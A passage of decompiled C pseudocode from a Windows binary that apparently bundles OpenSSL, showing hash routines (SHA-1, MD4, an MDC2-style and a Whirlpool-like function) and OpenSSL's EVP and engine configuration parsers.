        v19 = 512 - v7;
        v20 = v7 >> 3;
        if ( v3 < 512 - v7 )
        {
          result = (__m64 *)memcpy((char *)&a1[8] + v20, v4, v3 >> 3);
          v7 += a3;
          a3 = 0;
        }
        else
        {
          v21 = v3 - v19;
          v22 = v19 >> 3;
          a3 = v21;
          memcpy((char *)&a1[8] + v20, v4, v22);
          v4 = (__m64 *)((char *)v4 + v22);
          result = sub_4D3980(a1, a1 + 8, 1);
          v7 = 0;
        }
        a1[16].m64_i32[0] = v7;
      }
      else
      {
        result = sub_4D3980(a1, v4, v3 >> 9);
        v4 = (__m64 *)((char *)v4 + ((v18 << 6) & 0x1FFFFFFF));
        a3 &= 0x1FFu;
      }
      if ( !a3 )
        break;
      v3 = a3;
    }
  }
  return result;
}

//----- (004C6C80) --------------------------------------------------------
int __cdecl sub_4C6C80(__m64 *a1, __m64 *a2)
{
  unsigned __int32 v2; // eax
  int v3; // esi
  unsigned int v4; // eax
  __int8 *v5; // ecx
  __int32 *v6; // edx
  int v7; // esi
  unsigned __int32 v8; // eax

  v2 = (unsigned __int32)a2[16].m64_i32[0] >> 3;
  v3 = a2[16].m64_i32[0] & 7;
  if ( v3 )
    a2[8].m64_i8[v2] |= 128 >> v3;
  else
    a2[8].m64_i8[v2] = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x20 )
  {
    if ( v4 < 0x40 )
      memset((char *)&a2[8] + v4, 0, 64 - v4);
    sub_4D3980(a2, a2 + 8, 1);
    v4 = 0;
    goto LABEL_9;
  }
  if ( v4 < 0x20 )
LABEL_9:
    memset((char *)&a2[8] + v4, 0, 32 - v4);
  v5 = &a2[15].m64_i8[7];
  v6 = &a2[16].m64_i32[1];
  v7 = 8;
  do
  {
    v8 = *v6;
    *v5 = *v6;
    v8 >>= 8;
    *(v5 - 1) = v8;
    v8 >>= 8;
    *(v5 - 2) = v8;
    *(v5 - 3) = BYTE1(v8);
    v5 -= 4;
    ++v6;
    --v7;
  }
  while ( v7 );
  sub_4D3980(a2, a2 + 8, 1);
  if ( !a1 )
    return 0;
  qmemcpy(a1, a2, 0x40u);
  sub_4139E0(a2, 0xA8u);
  return 1;
}

//----- (004C6D70) --------------------------------------------------------
int __cdecl sub_4C6D70(__m64 *a1, __m64 *Src, unsigned int a3)
{
  unsigned int v4; // edi
  unsigned int v5; // ebx

  v4 = a3;
  if ( a3 >= 0x10000000 )
  {
    v5 = a3 >> 28;
    do
    {
      sub_4C69C0(a1, Src, 0x80000000);
      v4 -= 0x10000000;
      Src += 0x2000000;
      --v5;
    }
    while ( v5 );
  }
  if ( v4 )
    sub_4C69C0(a1, Src, 8 * v4);
  return 1;
}

//----- (004C6DD0) --------------------------------------------------------
int __cdecl sub_4C6DD0(_DWORD *a1, int *Src, size_t Size)
{
  size_t v3; // edi
  int *v4; // ebp
  size_t v5; // eax
  size_t v6; // ecx
  int v7; // eax
  _DWORD *v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = a1[5];
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++a1[6];
    a1[6] += Size >> 29;
    v7 = a1[23];
    a1[5] = v6;
    if ( v7 )
    {
      v8 = a1 + 7;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((char *)v8 + v7, Src, Size);
        a1[23] += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((char *)v8 + v7, Src, 64 - v7);
      sub_4D4D00(a1, a1 + 7, 1);
      v3 = Size - v10;
      a1[23] = 0;
      memset(a1 + 7, 0, 0x40u);
      v4 = (int *)((char *)Src + v10);
    }
    if ( v3 >> 6 )
    {
      sub_4D4D00(a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 = (int *)((char *)v4 + v11);
      v3 -= v11;
    }
    if ( v3 )
    {
      a1[23] = v3;
      memcpy(a1 + 7, v4, v3);
    }
  }
  return 1;
}

//----- (004C6EB0) --------------------------------------------------------
int __cdecl sub_4C6EB0(int a1, int *a2)
{
  int v2; // ebx
  int *v3; // esi
  unsigned int v4; // ebx
  int v5; // ecx

  v2 = a2[23];
  v3 = a2 + 7;
  *((_BYTE *)a2 + v2 + 28) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset((char *)v3 + v4, 0, 64 - v4);
    v4 = 0;
    sub_4D4D00(a2, v3, 1);
  }
  memset((char *)v3 + v4, 0, 56 - v4);
  *((_BYTE *)a2 + 84) = *((_BYTE *)a2 + 20);
  *((_BYTE *)a2 + 85) = *((_BYTE *)a2 + 21);
  *((_BYTE *)a2 + 86) = *((_BYTE *)a2 + 22);
  *((_BYTE *)a2 + 87) = *((_BYTE *)a2 + 23);
  *((_BYTE *)a2 + 88) = *((_BYTE *)a2 + 24);
  *((_BYTE *)a2 + 89) = *((_BYTE *)a2 + 25);
  *((_BYTE *)a2 + 90) = *((_BYTE *)a2 + 26);
  *((_BYTE *)a2 + 91) = *((_BYTE *)a2 + 27);
  sub_4D4D00(a2, a2 + 7, 1);
  a2[23] = 0;
  sub_4139E0((_BYTE *)a2 + 28, 0x40u);
  v5 = *a2;
  *(_WORD *)a1 = *a2;
  *(_BYTE *)(a1 + 2) = BYTE2(v5);
  *(_BYTE *)(a1 + 3) = HIBYTE(v5);
  *(_DWORD *)(a1 + 4) = a2[1];
  *(_DWORD *)(a1 + 8) = a2[2];
  *(_DWORD *)(a1 + 12) = a2[3];
  *(_DWORD *)(a1 + 16) = a2[4];
  return 1;
}

//----- (004C7000) --------------------------------------------------------
int __cdecl sub_4C7000(_DWORD *a1)
{
  memset(a1, 0, 0x60u);
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
  return 1;
}

//----- (004C7070) --------------------------------------------------------
int __cdecl sub_4C7070(int a1, int a2)
{
  unsigned __int8 *v2; // ecx
  int result; // eax
  unsigned __int8 *v4; // esi
  unsigned __int8 *v5; // edi
  unsigned __int8 *v6; // ebp
  int v7; // ebx
  int v8; // eax
  unsigned __int8 *v9; // esi
  int v10; // ecx
  int v11; // edx
  int v12; // ebx
  int v13; // eax
  int v14; // ebx
  int v15; // ecx
  int v16; // ebx
  int v17; // edx
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  int v21; // ebx
  int v22; // [esp+8h] [ebp-A0h]
  int v23; // [esp+8h] [ebp-A0h]
  unsigned int v24; // [esp+10h] [ebp-98h]
  int v25; // [esp+14h] [ebp-94h] BYREF
  int v26; // [esp+18h] [ebp-90h]
  int v27; // [esp+1Ch] [ebp-8Ch] BYREF
  int v28; // [esp+20h] [ebp-88h]
  _DWORD v29[32]; // [esp+24h] [ebp-84h] BYREF

  result = a2;
  v4 = v2;
  if ( a2 )
  {
    v5 = (unsigned __int8 *)(a1 + 12);
    v6 = (unsigned __int8 *)(a1 + 20);
    v24 = ((unsigned int)(a2 - 1) >> 3) + 1;
    do
    {
      v7 = *v4;
      v8 = v4[1];
      v9 = v4 + 1;
      v10 = *++v9;
      v11 = v9[1];
      v12 = (v8 << 8) | v7;
      v13 = (++v9)[1];
      ++v9;
      v14 = (v10 << 16) | v12;
      v15 = *++v9;
      v16 = (v11 << 24) | v14;
      v17 = *++v9;
      v18 = (v17 << 16) | (v15 << 8) | v13;
      LOBYTE(v17) = *v5;
      v22 = (v9[1] << 24) | v18;
      v26 = v22;
      v28 = v22;
      LOBYTE(v18) = *v6 & 0x9F | 0x20;
      v25 = v16;
      v27 = v16;
      v4 = v9 + 2;
      *v5 = v17 & 0x9F | 0x40;
      *v6 = v18;
      sub_4BAB40(v5);
      sub_4BABD0((unsigned __int16 *)v5, v29);
      sub_4B9240(&v27, v29, 1);
      sub_4BAB40(v6);
      sub_4BABD0((unsigned __int16 *)v6, v29);
      sub_4B9240(&v25, v29, 1);
      v19 = v22 ^ v26;
      v23 = v28 ^ v22;
      v20 = v16 ^ v25;
      v21 = v27 ^ v16;
      *v5 = v21;
      *(_BYTE *)(a1 + 13) = BYTE1(v21);
      *(_BYTE *)(a1 + 14) = BYTE2(v21);
      *(_BYTE *)(a1 + 15) = HIBYTE(v21);
      *(_DWORD *)(a1 + 16) = v19;
      *v6 = v20;
      *(_BYTE *)(a1 + 21) = BYTE1(v20);
      *(_BYTE *)(a1 + 22) = BYTE2(v20);
      *(_BYTE *)(a1 + 23) = HIBYTE(v20);
      *(_DWORD *)(a1 + 24) = v23;
      result = a1 + 26;
      --v24;
    }
    while ( v24 );
  }
  return result;
}
// 4C7098: variable 'v2' is possibly undefined
// 4C7070: using guessed type _DWORD var_84[32];

//----- (004C7220) --------------------------------------------------------
int __cdecl sub_4C7220(_DWORD *a1, _DWORD *a2)
{
  int v2; // eax
  int v3; // ecx

  v2 = *a2;
  v3 = a2[7];
  if ( *a2 )
  {
    if ( v3 != 2 )
    {
LABEL_6:
      memset((char *)a2 + v2 + 4, 0, 8 - v2);
      sub_4C7070((int)a2, 8);
      goto LABEL_7;
    }
LABEL_5:
    *((_BYTE *)a2 + v2 + 4) = 0x80;
    ++v2;
    goto LABEL_6;
  }
  if ( v3 == 2 )
    goto LABEL_5;
LABEL_7:
  *a1 = a2[3];
  a1[1] = a2[4];
  a1[2] = a2[5];
  a1[3] = a2[6];
  return 1;
}

//----- (004C7290) --------------------------------------------------------
int __cdecl sub_4C7290(size_t *a1, char *Src, size_t Size)
{
  size_t v3; // ebx
  size_t v4; // eax
  size_t v5; // edi
  char *v7; // ebp
  unsigned int v8; // edi
  size_t v9; // ebx

  v3 = Size;
  v4 = *a1;
  if ( *a1 )
  {
    v5 = 8 - v4;
    if ( Size < 8 - v4 )
    {
      memcpy((char *)a1 + v4 + 4, Src, Size);
      *a1 += Size;
      return 1;
    }
    memcpy((char *)a1 + v4 + 4, Src, 8 - v4);
    v3 = Size - v5;
    v7 = &Src[v5];
    *a1 = 0;
    sub_4C7070((int)a1, 8);
  }
  else
  {
    v7 = Src;
  }
  v8 = v3 & 0xFFFFFFF8;
  if ( (v3 & 0xFFFFFFF8) != 0 )
    sub_4C7070((int)a1, v3 & 0xFFFFFFF8);
  v9 = v3 - v8;
  if ( v9 )
  {
    memcpy(a1 + 1, &v7[v8], v9);
    *a1 = v9;
  }
  return 1;
}

//----- (004C7330) --------------------------------------------------------
unsigned __int8 *__cdecl sub_4C7330(int *a1, unsigned __int8 *a2, int a3)
{
  unsigned __int8 *result; // eax
  int v4; // ebx
  int v5; // ebp
  int v6; // esi
  int v7; // ecx
  int v8; // edx
  unsigned __int8 *v9; // eax
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // edx
  int v14; // edi
  int v15; // ecx
  int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  int v21; // edx
  int v22; // ecx
  int v23; // edx
  int v24; // edi
  int v25; // ecx
  int v26; // edi
  int v27; // edx
  int v28; // esi
  int v29; // esi
  int v30; // edi
  int v31; // edx
  int v32; // edi
  int v33; // edi
  int v34; // esi
  int v35; // ebp
  int v36; // edi
  int v37; // ebx
  int v38; // ebp
  int v39; // edi
  int v40; // ebp
  int v41; // ebx
  int v42; // ecx
  int v43; // ecx
  int v44; // ebp
  int v45; // ebx
  int v46; // ebp
  int v47; // ecx
  int v48; // edx
  int v49; // edx
  int v50; // ebp
  int v51; // ecx
  int v52; // edx
  int v53; // ebp
  int v54; // edx
  int v55; // esi
  int v56; // ebp
  int v57; // edx
  int v58; // ebp
  int v59; // esi
  int v60; // edi
  int v61; // ebp
  int v62; // esi
  int v63; // ebp
  int v64; // edi
  int v65; // ebx
  int v66; // ebx
  int v67; // ebp
  int v68; // edi
  int v69; // ebp
  int v70; // ebx
  int v71; // ecx
  int v72; // ebx
  int v73; // ebp
  int v74; // ecx
  int v75; // edx
  int v76; // ecx
  int v77; // edx
  int v78; // esi
  int v79; // esi
  int v80; // edx
  int v81; // ebp
  int v82; // esi
  int v83; // edi
  int v84; // edi
  int v85; // ebp
  int v86; // edi
  int v87; // esi
  int v88; // edi
  int v89; // edi
  int v90; // ebp
  int v91; // edi
  int v92; // ecx
  int v93; // esi
  int v94; // ebp
  int v95; // edi
  int v96; // ecx
  int v97; // esi
  int v98; // ebx
  int v99; // edx
  int v100; // edi
  int v101; // esi
  int v102; // ecx
  int v103; // edi
  int v104; // esi
  int v105; // ebx
  int v106; // ecx
  int v107; // edi
  int v108; // esi
  int v109; // ebx
  int v110; // ecx
  int v111; // edi
  int v112; // edx
  int v113; // ebx
  int v114; // ebp
  int v115; // esi
  int v116; // ecx
  int v117; // edi
  int v118; // ebx
  int v119; // esi
  int v120; // edx
  int v121; // edi
  int v122; // ebp
  int v123; // esi
  int v124; // edx
  int v125; // [esp+Ch] [ebp-48h]
  int v126; // [esp+10h] [ebp-44h]
  int v127; // [esp+14h] [ebp-40h]
  int v128; // [esp+18h] [ebp-3Ch]
  int v129; // [esp+1Ch] [ebp-38h]
  int v130; // [esp+20h] [ebp-34h]
  int v131; // [esp+24h] [ebp-30h]
  int v132; // [esp+28h] [ebp-2Ch]
  int v133; // [esp+2Ch] [ebp-28h]
  int v134; // [esp+30h] [ebp-24h]
  int v135; // [esp+34h] [ebp-20h]
  int v136; // [esp+38h] [ebp-1Ch]
  int v137; // [esp+3Ch] [ebp-18h]
  int v138; // [esp+40h] [ebp-14h]
  int v139; // [esp+44h] [ebp-10h]
  int v140; // [esp+48h] [ebp-Ch]
  int v141; // [esp+4Ch] [ebp-8h]
  int i; // [esp+5Ch] [ebp+8h]

  result = a2;
  v4 = a1[1];
  v5 = a1[2];
  v6 = a1[3];
  for ( i = *a1; a3; i = v124 )
  {
    v7 = *result;
    v8 = result[1];
    v9 = result + 1;
    v10 = (v8 << 8) | v7;
    v11 = *++v9;
    v12 = (v9[1] << 24) | (v11 << 16) | v10;
    v9 += 2;
    v13 = v9[1];
    v14 = v12;
    v15 = *v9++;
    v16 = (v13 << 8) | v15;
    v17 = *++v9;
    v18 = (v17 << 16) | v16;
    v19 = *++v9;
    v20 = (v19 << 24) | v18;
    v21 = v9[1];
    v133 = v20;
    v141 = v14;
    v9 += 2;
    --a3;
    v22 = v14 + (v6 ^ v4 & (v5 ^ v6));
    v23 = (*v9 << 8) | v21;
    v24 = *++v9;
    v129 = (v9[1] << 24) | (v24 << 16) | v23;
    v25 = __ROL4__(i + v22, 3);
    v9 += 2;
    v26 = v9[1];
    v27 = v6 + v133 + (v5 ^ v25 & (v4 ^ v5));
    v28 = *v9++;
    v29 = (v26 << 8) | v28;
    v30 = *++v9;
    v137 = (v9[1] << 24) | (v30 << 16) | v29;
    v31 = __ROL4__(v27, 7);
    v9 += 2;
    v32 = *(unsigned __int16 *)v9++;
    v33 = (*++v9 << 16) | v32;
    v127 = (v9[1] << 24) | v33;
    v34 = __ROL4__(v5 + v129 + (v4 ^ v31 & (v25 ^ v4)), 11);
    v9 += 2;
    v35 = *++v9;
    v36 = v4 + v137 + (v25 ^ v34 & (v25 ^ v31));
    v37 = (v35 << 8) | *(v9 - 1);
    v38 = *++v9;
    v135 = (v9[1] << 24) | (v38 << 16) | v37;
    v39 = __ROL4__(v36, 19);
    v9 += 2;
    v40 = v9[1];
    v41 = v25 + v127 + (v31 ^ v39 & (v34 ^ v31));
    v42 = *v9++;
    v43 = (v40 << 8) | v42;
    v44 = *++v9;
    v131 = (v9[1] << 24) | (v44 << 16) | v43;
    v45 = __ROL4__(v41, 3);
    v9 += 2;
    v46 = v9[1];
    v47 = v31 + v135 + (v34 ^ v45 & (v39 ^ v34));
    v48 = *v9++;
    v49 = (v46 << 8) | v48;
    v50 = *++v9;
    v51 = __ROL4__(v47, 7);
    v52 = (v9[1] << 24) | (v50 << 16) | v49;
    v9 += 2;
    v53 = v9[1];
    v139 = v52;
    ++v9;
    v54 = v34 + v131 + (v39 ^ v51 & (v45 ^ v39));
    v55 = (v53 << 8) | *(v9 - 1);
    v56 = *++v9;
    v126 = (v9[1] << 24) | (v56 << 16) | v55;
    v57 = __ROL4__(v54, 11);
    v9 += 2;
    v58 = *++v9;
    v59 = v39 + v139 + (v45 ^ v57 & (v45 ^ v51));
    v60 = (v58 << 8) | *(v9 - 1);
    v61 = *++v9;
    v134 = (v9[1] << 24) | (v61 << 16) | v60;
    v62 = __ROL4__(v59, 19);
    v9 += 2;
    v63 = v9[1];
    v64 = v45 + v126 + (v51 ^ v62 & (v57 ^ v51));
    v65 = *v9++;
    v66 = (v63 << 8) | v65;
    v67 = *++v9;
    v130 = (v9[1] << 24) | (v67 << 16) | v66;
    v68 = __ROL4__(v64, 3);
    v9 += 2;
    v69 = v9[1];
    v70 = v51 + v134 + (v57 ^ v68 & (v62 ^ v57));
    v71 = *v9;
    v72 = __ROL4__(v70, 7);
    v9 += 2;
    v138 = (v9[1] << 24) | (*v9 << 16) | (v69 << 8) | v71;
    v9 += 2;
    v73 = *++v9 << 8;
    v74 = v57 + v130 + (v62 ^ v72 & (v68 ^ v62));
    v75 = (v9[1] << 16) | v73 | *(v9 - 1);
    v128 = ((++v9)[1] << 24) | v75;
    v76 = __ROL4__(v74, 11);
    v9 += 2;
    v77 = v62 + v138 + (v68 ^ v76 & (v68 ^ v72));
    v78 = *(unsigned __int16 *)v9++;
    v79 = (*++v9 << 16) | v78;
    v136 = (v9[1] << 24) | v79;
    v80 = __ROL4__(v77, 19);
    v9 += 2;
    v81 = v9[1];
    v82 = v68 + v128 + (v72 ^ v80 & (v76 ^ v72));
    v83 = *v9++;
    v84 = (v81 << 8) | v83;
    v85 = *++v9;
    v86 = (v9[1] << 24) | (v85 << 16) | v84;
    v87 = __ROL4__(v82, 3);
    v9 += 2;
    v132 = v86;
    v88 = *(unsigned __int16 *)v9++;
    v89 = (*++v9 << 16) | v88;
    v90 = __ROL4__(v72 + v136 + (v76 ^ v87 & (v80 ^ v76)), 7);
    v140 = (v9[1] << 24) | v89;
    result = v9 + 2;
    v91 = __ROL4__(v76 + v132 + (v80 ^ v90 & (v87 ^ v80)), 11);
    v92 = __ROL4__(v80 + v140 + (v87 ^ v91 & (v87 ^ v90)), 19);
    v93 = __ROL4__(v141 + (v92 & v91 | v90 & (v92 | v91)) + v87 + 1518500249, 3);
    v94 = __ROL4__(v127 + (v93 & v92 | v91 & (v93 | v92)) + v90 + 1518500249, 5);
    v95 = __ROL4__(v126 + (v93 & v92 | v94 & (v93 | v92)) + v91 + 1518500249, 9);
    v96 = __ROL4__(v128 + (v93 & v95 | v94 & (v93 | v95)) + v92 + 1518500249, 13);
    v97 = __ROL4__(v133 + (v96 & v95 | v94 & (v96 | v95)) + v93 + 1518500249, 3);
    v98 = __ROL4__(v94 + v135 + (v97 & v96 | v95 & (v97 | v96)) + 1518500249, 5);
    v99 = __ROL4__(v134 + (v97 & v96 | v98 & (v97 | v96)) + v95 + 1518500249, 9);
    v100 = __ROL4__(v136 + (v97 & v99 | v98 & (v97 | v99)) + v96 + 1518500249, 13);
    v101 = __ROL4__(v129 + (v100 & v99 | v98 & (v100 | v99)) + v97 + 1518500249, 3);
    v125 = __ROL4__(v98 + v131 + (v101 & v100 | v99 & (v101 | v100)) + 1518500249, 5);
    v102 = __ROL4__(v130 + (v101 & v100 | v125 & (v101 | v100)) + v99 + 1518500249, 9);
    v103 = __ROL4__(v132 + (v101 & v102 | v125 & (v101 | v102)) + v100 + 1518500249, 13);
    v104 = __ROL4__(v137 + (v103 & v102 | v125 & (v103 | v102)) + v101 + 1518500249, 3);
    v105 = __ROL4__(v125 + v139 + (v104 & v103 | v102 & (v104 | v103)) + 1518500249, 5);
    v106 = __ROL4__(v138 + (v104 & v103 | v105 & (v104 | v103)) + v102 + 1518500249, 9);
    v107 = __ROL4__(v140 + (v104 & v106 | v105 & (v104 | v106)) + v103 + 1518500249, 13);
    v108 = __ROL4__(v141 + (v107 ^ v106 ^ v105) + v104 + 1859775393, 3);
    v109 = __ROL4__(v126 + (v108 ^ v107 ^ v106) + v105 + 1859775393, 9);
    v110 = __ROL4__(v127 + (v108 ^ v107 ^ v109) + v106 + 1859775393, 11);
    v111 = __ROL4__(v107 + v128 + (v108 ^ v110 ^ v109) + 1859775393, 15);
    v112 = __ROL4__(v129 + (v111 ^ v110 ^ v109) + v108 + 1859775393, 3);
    v113 = __ROL4__(v130 + (v112 ^ v111 ^ v110) + v109 + 1859775393, 9);
    v114 = __ROL4__(v131 + (v112 ^ v111 ^ v113) + v110 + 1859775393, 11);
    v115 = __ROL4__(v132 + (v112 ^ v114 ^ v113) + v111 + 1859775393, 15);
    v116 = __ROL4__(v133 + (v115 ^ v114 ^ v113) + v112 + 1859775393, 3);
    v117 = __ROL4__(v134 + (v116 ^ v115 ^ v114) + v113 + 1859775393, 9);
    v118 = __ROL4__(v135 + (v116 ^ v115 ^ v117) + v114 + 1859775393, 11);
    v119 = __ROL4__(v115 + v136 + (v116 ^ v118 ^ v117) + 1859775393, 15);
    v120 = __ROL4__(v137 + (v119 ^ v118 ^ v117) + v116 + 1859775393, 3);
    v121 = __ROL4__(v138 + (v120 ^ v119 ^ v118) + v117 + 1859775393, 9);
    v122 = __ROL4__(v139 + (v120 ^ v119 ^ v121) + v118 + 1859775393, 11);
    v123 = v140 + (v120 ^ v122 ^ v121) + v119 + 1859775393;
    *a1 += v120;
    a1[2] += v122;
    a1[3] += v121;
    v124 = *a1;
    v5 = a1[2];
    a1[1] += __ROL4__(v123, 15);
    v4 = a1[1];
    v6 = a1[3];
  }
  return result;
}

//----- (004C7A00) --------------------------------------------------------
int __cdecl sub_4C7A00(int a1, unsigned __int8 *Src, size_t Size)
{
  size_t v3; // edi
  unsigned __int8 *v4; // ebp
  size_t v5; // eax
  size_t v6; // ecx
  int v7; // eax
  int v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = *(_DWORD *)(a1 + 16);
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 20) += Size >> 29;
    v7 = *(_DWORD *)(a1 + 88);
    *(_DWORD *)(a1 + 16) = v6;
    if ( v7 )
    {
      v8 = a1 + 24;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((void *)(v7 + v8), Src, Size);
        *(_DWORD *)(a1 + 88) += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((void *)(v7 + v8), Src, 64 - v7);
      sub_4C7330((int *)a1, (unsigned __int8 *)(a1 + 24), 1);
      v3 = Size - v10;
      *(_DWORD *)(a1 + 88) = 0;
      memset((void *)(a1 + 24), 0, 0x40u);
      v4 = &Src[v10];
    }
    if ( v3 >> 6 )
    {
      sub_4C7330((int *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 += v11;
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 88) = v3;
      memcpy((void *)(a1 + 24), v4, v3);
    }
  }
  return 1;
}

//----- (004C7AE0) --------------------------------------------------------
int __cdecl sub_4C7AE0(int a1, int a2)
{
  int v2; // ebx
  unsigned __int8 *v3; // esi
  unsigned int v4; // ebx
  int v5; // ecx

  v2 = *(_DWORD *)(a2 + 88);
  v3 = (unsigned __int8 *)(a2 + 24);
  *(_BYTE *)(v2 + a2 + 24) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset(&v3[v4], 0, 64 - v4);
    v4 = 0;
    sub_4C7330((int *)a2, v3, 1);
  }
  memset(&v3[v4], 0, 56 - v4);
  *(_BYTE *)(a2 + 80) = *(_BYTE *)(a2 + 16);
  *(_BYTE *)(a2 + 81) = *(_BYTE *)(a2 + 17);
  *(_BYTE *)(a2 + 82) = *(_BYTE *)(a2 + 18);
  *(_BYTE *)(a2 + 83) = *(_BYTE *)(a2 + 19);
  *(_BYTE *)(a2 + 84) = *(_BYTE *)(a2 + 20);
  *(_BYTE *)(a2 + 85) = *(_BYTE *)(a2 + 21);
  *(_BYTE *)(a2 + 86) = *(_BYTE *)(a2 + 22);
  *(_BYTE *)(a2 + 87) = *(_BYTE *)(a2 + 23);
  sub_4C7330((int *)a2, (unsigned __int8 *)(a2 + 24), 1);
  *(_DWORD *)(a2 + 88) = 0;
  sub_4139E0((_BYTE *)(a2 + 24), 0x40u);
  v5 = *(_DWORD *)a2;
  *(_WORD *)a1 = *(_DWORD *)a2;
  *(_BYTE *)(a1 + 2) = BYTE2(v5);
  *(_BYTE *)(a1 + 3) = HIBYTE(v5);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  return 1;
}

//----- (004C7C10) --------------------------------------------------------
int __cdecl sub_4C7C10(int a1, int a2)
{
  int v2; // eax
  int v3; // eax
  int *v4; // ebx
  int v6; // edi
  int v7; // esi
  int v8; // [esp+4h] [ebp-4h] BYREF

  v2 = sub_432B60(a1);
  v3 = sub_4629F0(a2, v2);
  v4 = (int *)v3;
  if ( !v3 )
  {
    sub_408310(6, 177, 165, "crypto\\evp\\evp_cnf.c", 29);
    return 0;
  }
  v6 = 0;
  if ( sub_426A30(v3) <= 0 )
    return 1;
  while ( 1 )
  {
    v7 = sub_426A40(v4, v6);
    if ( strcmp(*(const char **)(v7 + 4), "fips_mode") )
    {
      sub_408310(6, 177, 169, "crypto\\evp\\evp_cnf.c", 53);
      sub_408610(4, "name=", *(_DWORD *)(v7 + 4), ", value=", *(_DWORD *)(v7 + 8));
      goto LABEL_10;
    }
    if ( !sub_44D2D0(v7, &v8) )
      break;
    if ( v8 > 0 )
    {
      sub_408310(6, 177, 167, "crypto\\evp\\evp_cnf.c", 48);
      return 0;
    }
LABEL_10:
    if ( ++v6 >= sub_426A30((int)v4) )
      return 1;
  }
  sub_408310(6, 177, 168, "crypto\\evp\\evp_cnf.c", 37);
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004C7D70) --------------------------------------------------------
int __usercall sub_4C7D70@<eax>(volatile LONG *a1@<esi>)
{
  int *v1; // eax
  _DWORD *v3; // [esp+0h] [ebp-4h]

  if ( sub_416200(v3) )
  {
    v1 = (int *)dword_5393C8;
    if ( dword_5393C8 || (v1 = sub_426AF0(), (dword_5393C8 = (int)v1) != 0) )
    {
      if ( sub_4269B0(v1, (int)a1) )
        return 1;
    }
    sub_4162A0(a1);
  }
  return 0;
}
// 4C7D71: variable 'v3' is possibly undefined
// 5393C8: using guessed type int dword_5393C8;

//----- (004C7DC0) --------------------------------------------------------
int __cdecl sub_4C7DC0(char *Str, const char *a2, int a3)
{
  char *v3; // esi
  char *v4; // eax
  int *v5; // eax
  _DWORD *v7; // ebp
  const char *v8; // edi
  char *v9; // eax
  char *v10; // ebx
  char *v11; // eax
  int v12; // eax
  int *v13; // eax
  int v14; // [esp+4h] [ebp-14h]
  int v15; // [esp+8h] [ebp-10h] BYREF
  int *v16; // [esp+Ch] [ebp-Ch]
  int v17; // [esp+10h] [ebp-8h]
  int v18; // [esp+14h] [ebp-4h]

  v3 = 0;
  v18 = 0;
  v15 = -1;
  v17 = 0;
  v4 = strchr(Str, 46);
  if ( v4 )
    Str = v4 + 1;
  v5 = (int *)sub_4629F0(a3, (int)a2);
  v16 = v5;
  if ( !v5 )
  {
    sub_408310(38, 188, 149, (int)"crypto\\engine\\eng_cnf.c", 61);
    return 0;
  }
  v14 = 0;
  if ( sub_426A30((int)v5) <= 0 )
    goto LABEL_45;
  do
  {
    v7 = (_DWORD *)sub_426A40(v16, v14);
    v8 = (const char *)v7[1];
    v9 = strchr(v8, 46);
    if ( v9 )
      v8 = v9 + 1;
    v10 = (char *)v7[2];
    if ( !strcmp(v8, "engine_id") )
    {
      Str = (char *)v7[2];
      goto LABEL_34;
    }
    if ( !strcmp(v8, "soft_load") )
    {
      v17 = 1;
      goto LABEL_34;
    }
    if ( !strcmp(v8, "dynamic_path") )
    {
      v11 = sub_42B220("dynamic");
      v3 = v11;
      if ( !v11 || !sub_443780(v11, "SO_PATH", v10, 0) || !sub_443780(v3, "LIST_ADD", "2", 0) )
        goto LABEL_27;
      v12 = sub_443780(v3, "LOAD", 0, 0);
      goto LABEL_33;
    }
    if ( !v3 )
    {
      v3 = sub_42B220(Str);
      if ( !v3 )
      {
        if ( v17 )
        {
          sub_408400();
          return 1;
        }
        goto LABEL_27;
      }
    }
    if ( !strcmp(v10, "EMPTY") )
      v10 = 0;
    if ( strcmp(v8, "init") )
    {
      if ( !strcmp(v8, "default_algorithms") )
        v12 = sub_441950((int *)v3, v10);
      else
        v12 = sub_443780(v3, v8, v10, 0);
LABEL_33:
      if ( !v12 )
        goto LABEL_27;
      goto LABEL_34;
    }
    if ( !sub_462AD0(a3, a2, "init", &v15) )
      goto LABEL_27;
    if ( v15 == 1 )
    {
      v12 = sub_4C7D70((volatile LONG *)v3);
      goto LABEL_33;
    }
    if ( v15 )
    {
      sub_408310(38, 188, 151, (int)"crypto\\engine\\eng_cnf.c", 122);
LABEL_27:
      sub_408310(38, 188, 102, (int)"crypto\\engine\\eng_cnf.c", 141);
      if ( v7 )
        sub_408610(6, "section=", *v7, ", name=", v7[1], ", value=", v7[2]);
      sub_429F60((volatile LONG *)v3);
      return v18;
    }
LABEL_34:
    ++v14;
  }
  while ( v14 < sub_426A30((int)v16) );
  if ( !v3 || v15 != -1 )
    goto LABEL_45;
  if ( !sub_416200(v3) )
  {
LABEL_42:
    v7 = 0;
    goto LABEL_27;
  }
  v13 = (int *)dword_5393C8;
